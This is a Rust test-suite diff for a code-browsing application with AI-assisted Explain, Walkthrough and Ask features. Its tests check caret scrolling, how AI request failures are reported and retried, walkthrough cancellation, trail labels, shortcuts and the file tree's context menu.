+    assert_eq!(app.ask_view, crate::AskView::Hidden, "the pill shows");
+    app.show_bottom = false;
+    let lh = app.line_height();
+    let view_h = 16.0 * lh;
+    let foot = crate::ui::PILL_H + crate::ui::ASK_MARGIN;
+    let from_top = |app: &mut App| {
+        let v = app.active_viewer_mut().unwrap();
+        v.viewport_h = view_h;
+        v.viewport_measured = true;
+        v.scroll_y = 0.0;
+        v.caret = Some((0, 0));
+    };
+    // How far down the view the caret line's foot is.
+    let caret_foot = |app: &App| {
+        let v = app.active_viewer().unwrap();
+        let (line, _) = v.caret.unwrap();
+        (v.row_of(line) + 1) as f32 * lh - v.scroll_y
+    };
+
+    // A narrow window: no margin, the pill over the code.
+    app.window_width = 760.0;
+    app.window_height = 520.0;
+    app.show_right_panel = true;
+    assert!(
+        !crate::ui::right_panel_shown(&app),
+        "no room for the margin"
+    );
+    from_top(&mut app);
+    let mut lowest = 0.0_f32;
+    for _ in 0..40 {
+        let _ = app.move_cursor(viewer::Motion::Down);
+        lowest = lowest.max(caret_foot(&app));
+        assert!(
+            caret_foot(&app) <= view_h - foot + 0.5,
+            "the caret's line ends at {} of {view_h}, under the pill from {}",
+            caret_foot(&app),
+            view_h - foot
+        );
+    }
+    assert!(
+        lowest > view_h - foot - lh,
+        "the caret went no lower than {lowest}"
+    );
+
+    // Page Down: the last line seen whole above the pill heads the page.
+    from_top(&mut app);
+    let last_seen = ((view_h - foot) / lh).floor() - 1.0;
+    let _ = app.scroll_pages(1);
+    let top = app.active_viewer().unwrap().scroll_y / lh;
+    assert!(
+        (top - last_seen).abs() < 0.01,
+        "the page starts at line {top}, the last seen was {last_seen}"
+    );
+
+    // Find-next to a match on the view's last line, under the pill.
+    from_top(&mut app);
+    let under = (view_h / lh) as usize - 1;
+    app.proj.find.open = true;
+    app.proj.find.query = format!("= {under};");
+    app.recompute_find();
+    let _ = app.update(Message::Editor(EditorMsg::FindStep(0)));
+    assert_eq!(app.active_viewer().unwrap().caret.map(|c| c.0), Some(under));
+    assert!(
+        caret_foot(&app) <= view_h - foot + 0.5,
+        "the match's line ends at {} of {view_h}, under the pill",
+        caret_foot(&app)
+    );
+    app.proj.find.open = false;
+
+    // A wide window: the margin under the pill, the caret down to the foot.
+    app.window_width = 1280.0;
+    app.window_height = 860.0;
+    assert!(crate::ui::right_panel_shown(&app), "the margin shows");
+    from_top(&mut app);
+    for _ in 0..40 {
+        let _ = app.move_cursor(viewer::Motion::Down);
+    }
+    assert!(
+        (caret_foot(&app) - view_h).abs() < 0.5,
+        "beside the margin the caret's line ends at {} of {view_h}",
+        caret_foot(&app)
+    );
+}
+
+/// An Explain that failed stands on the status line — in its own place, read
+/// or not — with a way to try the same Explain again, and goes when it is
+/// dismissed. The function asked for says why on its note. Said only as a
+/// notice, the failure was gone in ten seconds, and the note still said
+/// "Not explained yet." as if Explain had never been pressed.
+#[test]
+fn a_failed_explain_stands_until_dismissed_with_a_way_to_try_again() {
+    use crate::app::runtime::STATUS_LIFETIME;
+    use std::time::{Duration, Instant};
+    let mut app = scanned_app("explain-failure-stands");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let node = explain::Node::Function {
+        file: root.join("src/lib.rs"),
+        name: "helper".into(),
+        ordinal: 0,
+    };
+    // A pass for this function alone, under way.
+    app.proj.explain.running = true;
+    app.proj.explain.pass_target = Some(node.clone());
+    app.proj.explain.pass_target_new = true;
+    let _ = app.update(Message::Explain(ExplainMsg::Done {
+        stamp: app.stamp(),
+        generation: app.proj.explain.generation,
+        cache: explain::Cache::new(),
+        failures: PassFailures {
+            failed: 1,
+            stopped: Some(ExplainFailure::Unreached(
+                "request failed: Connection refused (os error 111)".into(),
+            )),
+            ..PassFailures::default()
+        },
+        tally: Default::default(),
+        written: Default::default(),
+    }));
+    let said = app.status.clone();
+    // In plain words: what was wrong, and what to check — not the OS's
+    // "(os error 111)", nor "try again" beside a Try again.
+    assert!(
+        said.contains("couldn't reach the AI provider (nothing answered at that address)"),
+        "{said}"
+    );
+    assert!(
+        !said.contains("os error") && !said.contains("try again"),
+        "{said}"
+    );
+    let notice = app.failure_shown().expect("said as a failure");
+    assert!(
+        matches!(
+            &notice.retry,
+            Some(Message::Explain(ExplainMsg::Explain(n))) if *n == node
+        ),
+        "{:?}",
+        notice.retry
+    );
+    // Its note says why.
+    assert!(
+        app.proj
+            .explain
+            .node_failed
+            .as_ref()
+            .is_some_and(|(n, why, fix)| *n == node
+                && (why.0)().contains("couldn't reach")
+                && *fix == Some(crate::app::state::LlmField::BaseUrl)),
+        "{:?}",
+        app.proj.explain.node_failed
+    );
+    // In the language spoken when it is said: switched to French, the card
+    // no longer keeps the English reason.
+    let said_in_french = crate::i18n::with_lang(crate::i18n::Lang::Fr, || {
+        app.proj
+            .explain
+            .node_failed
+            .as_ref()
+            .map(|(_, why, _)| (why.0)())
+    })
+    .unwrap();
+    assert!(
+        !said_in_french.contains("couldn't reach"),
+        "{said_in_french}"
+    );
+    // Read or not, it stands.
+    app.status_since = Some(Instant::now() - STATUS_LIFETIME - Duration::from_secs(1));
+    let _ = app.update(Message::Tick);
+    assert_eq!(
+        app.failure_shown().map(|f| f.said.as_str()),
+        Some(said.as_str()),
+        "it went before it was dealt with"
+    );
+    // Something else said goes beside it, not over it: the failure and
+    // its Try again stand.
+    app.status = "Copied 3 lines".into();
+    app.note_status();
+    assert_eq!(app.status, "Copied 3 lines");
+    assert_eq!(
+        app.failure_shown().map(|f| f.said.as_str()),
+        Some(said.as_str())
+    );
+    // Dismissed, it goes, and what else was said stays.
+    let _ = app.update(Message::Window(WindowMsg::DismissFailure));
+    assert_eq!(app.status, "Copied 3 lines");
+    assert!(app.failure_shown().is_none());
+    // Tried again, it goes too, and the same Explain sets out.
+    app.say_failure(
+        said.clone(),
+        Some(Message::Explain(ExplainMsg::Explain(node.clone()))),
+        crate::app::state::FailureOf::Explain,
+    );
+    app.proj.explain.running = false;
+    let _ = app.update(Message::Window(WindowMsg::RetryFailure));
+    assert!(app.failure_shown().is_none());
+    assert_ne!(app.status, said, "the old failure is still said");
+    // An Explain that then goes well takes an Explain failure away, and
+    // not a walkthrough's.
+    app.say_failure(
+        "Walkthrough failed: no".into(),
+        None,
+        crate::app::state::FailureOf::Walkthrough,
+    );
+    app.forget_failure_of(crate::app::state::FailureOf::Explain);
+    assert!(app.failure_shown().is_some());
+    app.forget_failure_of(crate::app::state::FailureOf::Walkthrough);
+    assert!(app.failure_shown().is_none());
+    assert!(app.status.is_empty(), "{}", app.status);
+}
+
+/// What a failed pass would set going after it — the search index, the
+/// overview, a refresh that was waiting — does not start: each said
+/// "Building semantic index…" over the failure, so a reader with
+/// embeddings set up never saw it, and each would spend AI that had just
+/// failed. A single function's Explain that failed is said of it, not as
+/// "Explained 345 functions, files and folders; 1 failed"; and where the
+/// function was explained, only what builds on it failed, there is
+/// nothing of it to try again.
+#[test]
+fn a_failed_explain_is_not_buried_by_what_follows_it() {
+    let mut app = scanned_app("explain-failure-not-buried");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let node = |name: &str| explain::Node::Function {
+        file: root.join("src/lib.rs"),
+        name: name.into(),
+        ordinal: 0,
+    };
+    let cached = explain::Cached {
+        summary: "does other things".into(),
+        prompt_hash: 1,
+        detail: None,
+        basis: None,
+    };
+    let mut cache = explain::Cache::new();
+    cache.insert(node("other"), cached.clone());
+    app.set_explain_cache(cache.clone());
+    app.embed_available = true;
+    app.proj.refresh_pending = true;
+    app.proj.explain.running = true;
+    app.proj.explain.pass_target = Some(node("helper"));
+    app.proj.explain.pass_target_new = true;
+    let lost = ExplainFailure::Network("connection reset".into());
+    let done = app.update(Message::Explain(ExplainMsg::Done {
+        stamp: app.stamp(),
+        generation: app.proj.explain.generation,
+        cache: cache.clone(),
+        failures: PassFailures {
+            failed: 1,
+            calls: vec![lost.clone()],
+            ..PassFailures::default()
+        },
+        tally: Default::default(),
+        written: Default::default(),
+    }));
+    assert!(
+        app.status
+            .starts_with("Couldn't explain helper(): the connection to the AI was lost"),
+        "{}",
+        app.status
+    );
+    for message in run_task(done) {
+        assert!(
+            !matches!(
+                message,
+                Message::Semantic(SemanticMsg::BuildIndex)
+                    | Message::Overview(OverviewMsg::Generate)
+                    | Message::Explain(ExplainMsg::Refresh)
+            ),
+            "{message:?}"
+        );
+        let _ = app.update(message);
+    }
+    assert!(app.failure_shown().is_some(), "buried by {:?}", app.status);
+    assert!(!app.proj.refresh_pending);
+
+    // The function explained, a summary built on it not: Try again would
+    // only show its note.
+    let mut with_helper = cache;
+    with_helper.insert(node("helper"), cached);
+    app.proj.explain.running = true;
+    app.proj.explain.pass_target = Some(node("helper"));
+    app.proj.explain.pass_target_new = true;
+    let _ = app.update(Message::Explain(ExplainMsg::Done {
+        stamp: app.stamp(),
+        generation: app.proj.explain.generation,
+        cache: with_helper,
+        failures: PassFailures {
+            failed: 1,
+            calls: vec![lost],
+            ..PassFailures::default()
+        },
+        tally: Default::default(),
+        written: [(node("helper"), None)].into_iter().collect(),
+    }));
+    let notice = app.failure_shown().expect("said as a failure");
+    assert!(notice.retry.is_none(), "{:?}", notice.retry);
+    // Said of what failed, not of helper(), whose note is there: "Couldn't
+    // explain helper()" stood in red beside it.
+    assert!(
+        app.status
+            .starts_with("Explained helper(); 1 summary built on it failed:"),
+        "{}",
+        app.status
+    );
+}
+
+/// A failure that will fail again whatever is tried — a prompt too long for
+/// the model — says nothing of the provider or the embedding service: what
+/// follows a pass (the search index, the overview) still follows it. One
+/// function too big for a small model kept the index from ever being built.
+#[test]
+fn a_failure_that_will_recur_does_not_hold_up_what_follows_the_pass() {
+    let mut app = scanned_app("explain-failure-recurs");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let mut cache = explain::Cache::new();
+    cache.insert(
+        explain::Node::Function {
+            file: root.join("src/lib.rs"),
+            name: "origin".into(),
+            ordinal: 0,
+        },
+        explain::Cached {
+            summary: "makes a point".into(),
+            prompt_hash: 1,
+            detail: None,
+            basis: None,
+        },
+    );
+    app.embed_available = true;
+    app.proj.explain.running = true;
+    let done = app.update(Message::Explain(ExplainMsg::Done {
+        stamp: app.stamp(),
+        generation: app.proj.explain.generation,
+        cache,
+        failures: PassFailures {
+            failed: 1,
+            calls: vec![ExplainFailure::Rejected {
+                what: crate::app::tasks::Rejection::Length,
+                detail: "context length exceeded".into(),
+            }],
+            ..PassFailures::default()
+        },
+        tally: Default::default(),
+        written: Default::default(),
+    }));
+    assert!(
+        run_task(done)
+            .iter()
+            .any(|m| matches!(m, Message::Semantic(SemanticMsg::BuildIndex))),
+        "no index built after a failure that will recur"
+    );
+}
+
+/// A failure stands for the project it happened in: opening another one,
+/// it went along, and its Try again made a paid call there.
+#[test]
+fn a_failure_does_not_follow_the_reader_to_another_project() {
+    let mut app = scanned_app("fail-switch-a");
+    app.say_failure(
+        "Walkthrough failed: no".into(),
+        Some(Message::Walk(WalkMsg::Generate("checkout".into()))),
+        crate::app::state::FailureOf::Walkthrough,
+    );
+    assert!(app.failure_shown().is_some());
+    scan_synchronously(&mut app, fixture_project("fail-switch-b"));
+    assert!(app.failure_shown().is_none(), "{:?}", app.failure_notice);
+    assert_ne!(app.status, "Walkthrough failed: no");
+}
+
+/// Asked for again another way (the row's Try again, Generate), a failure
+/// goes: its own Try again, still standing, minted a second paid request,
+/// and the first ran on out of reach of Stop.
+#[test]
+fn a_walkthrough_asked_for_again_takes_its_failure_away() {
+    let mut app = scanned_app("walk-failure-again");
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    app.say_failure(
+        "Walkthrough failed: no".into(),
+        Some(Message::Walk(WalkMsg::Generate("checkout".into()))),
+        crate::app::state::FailureOf::Walkthrough,
+    );
+    let _ = app.update(Message::Walk(WalkMsg::Generate("checkout".into())));
+    assert!(app.failure_shown().is_none(), "{:?}", app.failure_notice);
+    assert!(app.proj.walk.abort.is_some());
+    // A second request stops the first: one in flight at a time.
+    let (_, first) = Task::<Message>::none().abortable();
+    let watch = first.clone();
+    app.proj.walk.abort = Some(first);
+    let _ = app.update(Message::Walk(WalkMsg::Generate("checkout".into())));
+    assert!(watch.is_aborted());
+    // Left for another project, it is stopped too: dropped, it ran on and
+    // was billed.
+    let (_, running) = Task::<Message>::none().abortable();
+    let watch = running.clone();
+    app.proj.walk.abort = Some(running);
+    scan_synchronously(&mut app, fixture_project("walk-failure-again-b"));
+    assert!(watch.is_aborted());
+}
+
+/// The status line's Try again on a walkthrough's failure asks for that
+/// tour again, and the failure goes: one request, not a second beside it.
+#[test]
+fn a_walkthroughs_failure_is_tried_again_from_the_status_line() {
+    let mut app = scanned_app("walk-failure-retry");
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    app.say_failure(
+        "Walkthrough failed: no".into(),
+        Some(Message::Walk(WalkMsg::Generate("checkout".into()))),
+        crate::app::state::FailureOf::Walkthrough,
+    );
+    let before = app.proj.walk.seq;
+    let _ = app.update(Message::Window(WindowMsg::RetryFailure));
+    assert!(app.failure_shown().is_none(), "{:?}", app.failure_notice);
+    assert_eq!(app.proj.walk.seq, before + 1);
+    assert_eq!(app.proj.walk.generating.as_deref(), Some("checkout"));
+    // Nothing left to try again: a second press does nothing.
+    let _ = app.update(Message::Window(WindowMsg::RetryFailure));
+    assert_eq!(app.proj.walk.seq, before + 1);
+}
+
+/// With no tour yet the header shows New: the first one landing keeps it
+/// there, its field and Generate, where it turned into "Search
+/// walkthroughs…" by itself.
+#[test]
+fn the_first_walkthrough_keeps_the_header_on_new() {
+    let mut app = scanned_app("walk-first-new");
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    assert!(app.proj.walk.library.is_empty());
+    assert_eq!(app.walk_ui.mode, crate::WalkMode::Search);
+    let _ = app.update(Message::Walk(WalkMsg::Generate(String::new())));
+    assert_eq!(app.walk_ui.mode, crate::WalkMode::Walk);
+}
+
+/// Stopped, a tour's answer already on its way is not kept: it was saved,
+/// "finished in the background", over "Walkthrough stopped".
+#[test]
+fn a_stopped_walkthroughs_late_answer_is_not_kept() {
+    let mut app = scanned_app("walk-cancel-late");
+    app.proj.walk.seq += 1;
+    let seq = app.proj.walk.seq;
+    app.proj.walk.pending = Some(seq);
+    app.proj.walk.generating = Some("checkout".into());
+    let _ = app.update(Message::Walk(WalkMsg::Cancel));
+    let mut tours = walk_tour("origin", Some(5));
+    let _ = app.update(Message::Walk(WalkMsg::Done {
+        stamp: app.stamp(),
+        seq,
+        scope: "checkout".into(),
+        result: Ok(tours.remove(0)),
+    }));
+    assert!(app.proj.walk.library.is_empty());
+    assert_eq!(app.status, "Walkthrough stopped");
+}
+
+/// Try again on an answer that failed keeps the question being typed: it
+/// put the old question in its place, and the draft was gone. And it asks
+/// in the failed turn's place: a second copy of the question and its
+/// failure went under the first.
+#[test]
+fn asking_again_keeps_the_draft_being_typed() {
+    let mut app = scanned_app("ask-again-draft");
+    app.proj.ask_input = "my draft".into();
+    let task = app.update(Message::Ask(AskMsg::Suggested("why?".into())));
+    let _ = run_task(task);
+    assert_eq!(app.proj.ask_input, "my draft");
+
+    app.proj.ask_turns.clear();
+    let mut failed = AskTurn {
+        stream: 1,
+        question: "what does origin do?".into(),
+        spoken: false,
+        answer_md: "*Couldn't answer*".into(),
+        answer: Vec::new(),
+        settled: 0,
+        draft_from: None,
+        sources: Vec::new(),
+        steps: Vec::new(),
+        streaming: false,
+        extras: Default::default(),
+    };
+    failed.extras.failed = true;
+
+    // Nothing to ask with (no key): the failed turn stays where it was,
+    // with its Try again, and the draft stays in the field. The question
+    // was dropped: in no turn, no queue, and not the field.
+    app.llm_available = false;
+    app.llm_config_cache = Some(None);
+    app.proj.ask_turns.push(failed);
+    let _ = app.update(Message::Ask(AskMsg::AskAgain(0)));
+    assert!(
+        app.proj
+            .ask_turns
+            .first()
+            .is_some_and(|t| t.extras.failed && t.question == "what does origin do?"),
+        "the question went: {:?}",
+        app.proj
+            .ask_turns
+            .iter()
+            .map(|t| &t.question)
+            .collect::<Vec<_>>()
+    );
+    assert_eq!(app.proj.ask_input, "my draft");
+
+    // Asked with: the failed turn goes, and the question is asked again.
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let _ = app.update(Message::Ask(AskMsg::AskAgain(0)));
+    assert!(
+        app.proj
+            .ask_turns
+            .iter()
+            .all(|t| !(t.extras.failed && t.question == "what does origin do?" && t.stream == 1)),
+        "the failed turn stayed"
+    );
+    assert!(app.proj.asking, "asked again");
+    assert_eq!(app.proj.ask_input, "my draft");
+}
+
+/// An answer that fails part-way says so where it stops, and can be asked
+/// again. It ended mid-sentence with nothing said: with Ask open the
+/// reader took the half for the whole, and with Ask put away the status
+/// line's Try again asked nothing (only a turn with no answer at all
+/// counted as failed). A code block it stopped in is closed first.
+#[test]
+fn an_answer_that_fails_part_way_says_so_and_is_asked_again() {
+    for view in [AskView::Compact, AskView::Hidden] {
+        let mut app = scanned_app("ask-failed-part-way");
+        app.ask_view = view;
+        app.proj.ask_turns.push(AskTurn {
+            stream: 5,
+            question: "where is the total?".into(),
+            streaming: true,
+            ..Default::default()
+        });
+        let _ = app.update(Message::Ask(AskMsg::Delta {
+            stamp: app.stamp(),
+            stream: 5,
+            text: "The cart total is computed in\n\n```py\ntotal =".into(),
+        }));
+        let _ = app.update(Message::Ask(AskMsg::StreamEnded {
+            stamp: app.stamp(),
+            stream: 5,
+            outcome: clew_protocol::StreamOutcome::Failed("server disconnected".into()),
+        }));
+        let turn = &app.proj.ask_turns[0];
+        assert!(!turn.streaming);
+        assert!(turn.answer_md.starts_with("The cart total is computed in"));
+        assert!(
+            turn.answer_md.contains("Couldn't finish") && turn.answer_md.contains("disconnected"),
+            "{view:?}: {}",
+            turn.answer_md
+        );
+        assert_eq!(
+            turn.answer_md.matches("```").count() % 2,
+            0,
+            "{}",
+            turn.answer_md
+        );
+        assert!(turn.extras.failed, "{view:?}: not to be asked again");
+        if view == AskView::Hidden {
+            assert!(app.failure_shown().is_some());
+            // Its Try again asks it again, in its place.
+            app.llm_config_cache = Some(Some(unreachable_llm()));
+            open_synchronously(&mut app, "src/lib.rs", None);
+            let _ = app.update(Message::Window(WindowMsg::RetryFailure));
+            assert!(app.proj.asking, "asked nothing again");
+            assert!(app.failure_shown().is_none());
+            assert!(
+                !app.proj.ask_turns.iter().any(|t| t.stream == 5),
+                "the failed turn stayed"
+            );
+        }
+    }
+}
+
+/// A failure on the status bar, of an answer asked with Ask put away, goes
+/// with its conversation — cleared, left for a new one or another, or
+/// deleted — and once a later answer comes: it came back each time Ask was
+/// put away, and its Try again named a turn of a conversation gone.
+#[test]
+fn an_ask_failure_goes_with_its_conversation() {
+    let failed = |app: &mut App| {
+        app.ask_view = AskView::Hidden;
+        let stream = app.mint_request_id();
+        app.proj.ask_turns.push(AskTurn {
+            stream,
+            question: "why?".into(),
+            streaming: true,
+            ..Default::default()
+        });
+        let _ = app.update(Message::Ask(AskMsg::StreamEnded {
+            stamp: app.stamp(),
+            stream,
+            outcome: clew_protocol::StreamOutcome::Failed("boom".into()),
+        }));
+        assert!(app.failure_shown().is_some());
+    };
+    let mut app = scanned_app("ask-failure-conversation");
+    failed(&mut app);
+    let _ = app.update(Message::Ask(AskMsg::Clear));
+    assert!(app.failure_notice.is_none(), "kept past Clear");
+    failed(&mut app);
+    let _ = app.new_ask_session();
+    assert!(app.failure_notice.is_none(), "kept past a new conversation");
+    failed(&mut app);
+    let stream = app.mint_request_id();
+    app.proj.ask_turns.push(AskTurn {
+        stream,
+        question: "and now?".into(),
+        streaming: true,
+        ..Default::default()
+    });
+    let _ = app.update(Message::Ask(AskMsg::StreamEnded {
+        stamp: app.stamp(),
+        stream,
+        outcome: clew_protocol::StreamOutcome::Done,
+    }));
+    assert!(app.failure_notice.is_none(), "kept past a later answer");
+}
+
+/// A stop made by a jump to a line in another file keeps its function's
+/// name once that file is closed: noted only at the jump, before the file
+/// had loaded, it said "lib.rs:4" again.
+#[test]
+fn a_jumped_to_stop_keeps_its_function_once_its_file_is_closed() {
+    let mut app = scanned_app("trail-fn-jump");
+    let lib = app.proj.project.as_ref().unwrap().root.join("src/lib.rs");
+    open_synchronously(&mut app, "notes.txt", None);
+    open_synchronously(&mut app, "src/lib.rs", Some(4));
+    assert_eq!(app.function_around(&lib, 4).as_deref(), Some("origin"));
+    open_synchronously(&mut app, "notes.txt", None);
+    assert!(app.proj.panes.iter().flatten().all(|v| v.abs != lib));
+    assert_eq!(app.function_around(&lib, 4).as_deref(), Some("origin"));
+}
+
+/// A walkthrough that failed keeps its row where it was asked for, saying
+/// why, with a way to try again — and stands on the status line. The
+/// "Generating…" row just went away, as if nothing had been asked.
+#[test]
+fn a_failed_walkthrough_keeps_its_row_with_a_way_to_try_again() {
+    let mut app = scanned_app("walk-failure-row");
+    app.proj.walk.seq += 1;
+    app.proj.walk.pending = Some(app.proj.walk.seq);
+    app.proj.walk.generating = Some("checkout".into());
+    let _ = app.update(Message::Walk(WalkMsg::Done {
+        stamp: app.stamp(),
+        seq: app.proj.walk.seq,
+        scope: "checkout".into(),
+        result: Err(walkthrough::Failure::Other(
+            "request failed: Connection refused".into(),
+        )),
+    }));
+    assert_eq!(
+        app.proj.walk.failed.as_ref().map(|(s, _)| s.as_str()),
+        Some("checkout")
+    );
+    assert!(
+        matches!(
+            app.failure_shown().and_then(|f| f.retry.clone()),
+            Some(Message::Walk(WalkMsg::Generate(scope))) if scope == "checkout"
+        ),
+        "{:?}",
+        app.failure_notice
+    );
+    // Nothing answered at the base URL: its Settings goes to that field,
+    // the keyboard in it.
+    assert_eq!(
+        app.failure_shown().and_then(|f| f.about),
+        Some(crate::app::state::LlmField::BaseUrl)
+    );
+    let _ = app.update(Message::Settings(SettingsMsg::Fix(
+        crate::app::state::LlmField::BaseUrl,
+    )));
+    assert!(app.settings.open);
+    assert_eq!(app.settings.page, crate::SettingsPage::LanguageModel);
+    let _ = app.update(Message::Settings(SettingsMsg::Close));
+    // Dismissed from its row, it goes; a change review is tried again by
+    // its diff, a run's tour by the last run.
+    let _ = app.update(Message::Walk(WalkMsg::ForgetFailure));
+    assert!(app.proj.walk.failed.is_none());
+    assert!(matches!(
+        WalkMsg::again("@diff main"),
+        WalkMsg::GenerateDiff
+    ));
+    assert!(matches!(
+        WalkMsg::again("@trace app"),
+        WalkMsg::GenerateTrace
+    ));
+}
+
+/// A debug run's tour opens each step where the run stopped — its line —
+/// not on its function's first line; a written tour's step is still found
+/// by its symbol, wherever it has moved to.
+#[test]
+fn a_recorded_runs_step_opens_where_the_run_stopped() {
+    let mut app = scanned_app("walk-trace-line");
+    let mut tours = walk_tour("origin", Some(5));
+    tours[0].scope = "@trace app.py".into();
+    tours.extend(walk_tour("origin", Some(5)));
+    app.proj.walk.library = tours;
+    app.proj.walk.open = Some("@trace app.py".into());
+    let step = app.tour_step(0).unwrap();
+    assert_eq!((step.symbol, step.line), (None, Some(5)));
+    app.proj.walk.open = Some("tour".into());
+    let step = app.tour_step(0).unwrap();
+    assert_eq!(step.symbol.as_deref(), Some("origin"));
+}
+
+/// A trail stop keeps the function it was in once its file is closed:
+/// "main():23" became "main.py:23" when the reader left main.py, the name
+/// looked up in a file no longer open. What was noted for a line goes when
+/// it is in no function any more.
+#[test]
+fn a_trail_stop_keeps_its_function_once_its_file_is_closed() {
+    let mut app = scanned_app("trail-fn-kept");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let closed = root.join("src/lib.rs");
+    assert!(app.proj.panes.iter().flatten().all(|v| v.abs != closed));
+    assert_eq!(app.function_around(&closed, 4), None);
+    app.note_trail_fn(&closed, 4, Some("origin".into()));
+    assert_eq!(app.function_around(&closed, 4).as_deref(), Some("origin"));
+    assert_eq!(
+        crate::ui::stop_label(
+            &app,
+            &crate::history::Loc {
+                path: closed.clone(),
+                line: Some(4)
+            },
+            None
+        ),
+        "origin():4"
+    );
+    app.note_trail_fn(&closed, 4, None);
+    assert_eq!(app.function_around(&closed, 4), None);
+}
+
+/// A walkthrough being made can be stopped from its row: the request goes,
+/// the row is no longer "Generating…", and a late answer to it opens
+/// nothing. While generating, its row had no control at all.
+#[test]
+fn a_walkthrough_being_made_can_be_stopped() {
+    let mut app = scanned_app("walk-cancel");
+    app.proj.walk.seq += 1;
+    let seq = app.proj.walk.seq;
+    app.proj.walk.pending = Some(seq);
+    app.proj.walk.generating = Some("checkout".into());
+    let (_, abort) = Task::<Message>::none().abortable();
+    app.proj.walk.abort = Some(abort);
+    let _ = app.update(Message::Walk(WalkMsg::Cancel));
+    assert!(app.proj.walk.generating.is_none());
+    assert!(app.proj.walk.pending.is_none());
+    assert!(app.proj.walk.abort.is_none());
+    assert_eq!(app.status, "Walkthrough stopped");
+    // Its failure, coming late, is not said.
+    let _ = app.update(Message::Walk(WalkMsg::Done {
+        stamp: app.stamp(),
+        seq,
+        scope: "checkout".into(),
+        result: Err(walkthrough::Failure::Other("cancelled".into())),
+    }));
+    assert!(app.proj.walk.failed.is_none());
+    assert!(app.failure_shown().is_none());
+    // A debug run's tour is made again only from the run it records.
+    assert!(app.can_regenerate("checkout"));
+    assert!(!app.can_regenerate("@trace app.py"));
+}
+
+/// Ctrl+Home goes to the file's very start — its first column too — and
+/// Ctrl+G, Go to Line in other editors, opens Go to Line where nothing
+/// else holds it.
+#[test]
+fn ctrl_home_goes_to_the_start_and_ctrl_g_to_a_line() {
+    let mut app = scanned_app("ctrl-home-ctrl-g");
+    let rel = app.proj.project.as_ref().unwrap().files[0].rel.clone();
+    open_synchronously(&mut app, &rel, None);
+    if let Some(v) = app.proj.panes[0].as_mut() {
+        v.caret = Some((0, 5));
+    }
+    let _ = app.move_cursor(viewer::Motion::FileStart);
+    assert_eq!(app.active_viewer().unwrap().caret, Some((0, 0)));
+    if !crate::keymap::MAC_KEYS {
+        assert_eq!(
+            crate::keymap::alias_for(&crate::keymap::Chord::cmd('g')),
+            Some(crate::keymap::Action::GotoLine)
+        );
+        assert!(
+            app.keymap
+                .action_for(&crate::keymap::Chord::cmd('g'))
+                .is_none()
+        );
+        // And said where the keys are listed: it worked, and nothing said
+        // so.
+        let shown = app.keymap.shown(crate::keymap::Action::GotoLine);
+        assert!(shown.ends_with("/ Ctrl+G"), "{shown}");
+    }
+    // Ctrl+End goes to the file's very end — its last column too.
+    let _ = app.move_cursor(viewer::Motion::FileEnd);
+    let v = app.active_viewer().unwrap();
+    let last = v.lines.len() - 1;
+    assert_eq!(v.caret, Some((last, v.line_len(last))));
+}
+
+/// The file tree's right-click menu: opened for the row the click named,
+/// at where it was; each act closes it and does what it says.
+#[test]
+fn the_tree_menu_opens_beside_copies_and_closes() {
+    use crate::app::state::TreeAct;
+    let mut app = scanned_app("tree-menu-acts");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    // The tree on screen, nothing over it (the fixture's language server
+    // asks first).
+    app.show_left_sidebar = true;
+    app.sidebar = crate::SidebarTab::Files;
+    app.proj.pending_lsp_consent = Default::default();
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let raise = |app: &mut App, rel: &str, dir: bool| {
+        let _ = app.update(Message::Project(ProjectMsg::TreeMenuFor {
+            rel: rel.into(),
+            dir,
+        }));
+        let _ = app.update(Message::Project(ProjectMsg::TreeMenuAt {
+            x: 40.0,
+            y: 120.0,
+        }));
+    };
+
+    // A click on no row (the room under the last) opens nothing.
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAt {
+        x: 40.0,
+        y: 500.0,
+    }));
+    assert!(app.proj.tree_menu.is_none());
+
+    raise(&mut app, "notes.txt", false);
+    let menu = app.proj.tree_menu.as_ref().expect("the menu is up");
+    assert_eq!(
+        (menu.rel.as_str(), menu.x, menu.y),
+        ("notes.txt", 40.0, 120.0)
+    );
+    assert_eq!(app.proj.tree_cursor.as_deref(), Some("notes.txt"));
+
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(
+        TreeAct::CopyRelativePath,
+    )));
+    assert!(app.proj.tree_menu.is_none());
+    assert_eq!(app.status, "Copied notes.txt");
+
+    raise(&mut app, "notes.txt", false);
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(TreeAct::CopyPath)));
+    assert_eq!(
+        app.status,
+        format!("Copied {}", root.join("notes.txt").display())
+    );
+
+    // Beside what is read: the split opens, the file in its second half.
+    raise(&mut app, "notes.txt", false);
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(
+        TreeAct::OpenToSide,
+    )));
+    assert!(app.proj.tree_menu.is_none());
+    assert!(app.proj.split);
+    assert_eq!(app.proj.active, 1);
+    land_active_load(&mut app, root.join("notes.txt"), None);
+    let rel_in = |app: &App, pane: usize| {
+        app.proj.panes[pane]
+            .as_ref()
+            .map(|v| v.rel.clone())
+            .unwrap_or_default()
+    };
+    assert_eq!(
+        (rel_in(&app, 0), rel_in(&app, 1)),
+        ("src/lib.rs".to_string(), "notes.txt".to_string())
+    );
+
+    // A folder's first row folds it.
+    app.proj.expanded.insert("src".into());
+    raise(&mut app, "src", true);
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(TreeAct::Open)));
+    assert!(!app.proj.expanded.contains("src"));
+
+    // The code's own menu takes the tree's place: one menu at a time,
+    // nor does the tree's come back when that one closes.
+    raise(&mut app, "notes.txt", false);
+    let _ = app.update(Message::Hover(HoverMsg::ContextMenuOpened {
+        pane: 0,
+        line: 0,
+        col: 0,
+        x: 300.0,
+        y: 200.0,
+    }));
+    assert!(app.proj.context_menu.is_some());
+    assert!(app.proj.tree_menu.is_none());
+    let _ = app.update(Message::Hover(HoverMsg::ContextMenuClosed));
+    assert!(app.proj.context_menu.is_none() && app.proj.tree_menu.is_none());
+}
